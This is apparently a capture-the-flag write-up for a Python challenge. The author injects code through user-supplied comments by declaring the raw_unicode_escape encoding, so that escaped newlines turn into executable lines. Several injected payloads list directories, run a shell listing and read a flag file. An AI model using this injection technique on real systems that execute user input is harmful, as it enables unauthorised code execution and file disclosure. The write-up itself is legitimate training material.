# Challenge: My Awesome Python Homework Assignment 

## MISC: Python Comments

### Description

We are given a Python script `main.py` and a connection:

```bash
nc smtg.smtg.smtg.smtg smtg
```

The Python script prints a simple palindrome checking program but allows the user to **insert comments** at any line before saving and executing the script.

However, by using a **Python encoding trick**, comments can be used to **inject actual executable code** instead of just being ignored.

### Solution

The main vulnerability lies in the fact that we can add:

```python
# coding: raw_unicode_escape
```

This encoding makes Python treat `\u000a` as **real newlines** inside comments.

Thus, we can inject real Python code into the running script through comments.

First, I injected this to list files:

```python
# \u000aimport os\u000aprint(os.listdir("."))\u000a
```

Then, to explore deeper:

```python
# \u000aimport os\u000aprint("Is directory:", os.path.isdir("run"))\u000aif os.path.isdir("run"):\u000a  print("Contents of run:", os.listdir("run"))\u000aelse:\u000a  print("Contents of run:", open("run", "r").read())\u000a
```

I found that `run` was just the running file itself, no flag yet.

Next, I used a deeper scan:

```python
# \u000aimport os, glob\u000aprint("Current dir:", os.getcwd())\u000aprint("All files (detailed):", os.popen("ls -la").read())\u000aprint("Parent dir contents:", os.listdir(".."))\u000aprint("Flag files:", glob.glob("**/*flag*", recursive=True))\u000a
```

✅ Found a `flag.txt` in the parent directory!

Finally, I read the flag directly:

```python
# \u000aimport os\u000aprint("Flag content:", open("/flag.txt").read())\u000a
```

### Final Flag

```
texsaw{i_got_100%,thanks!!1!}
```

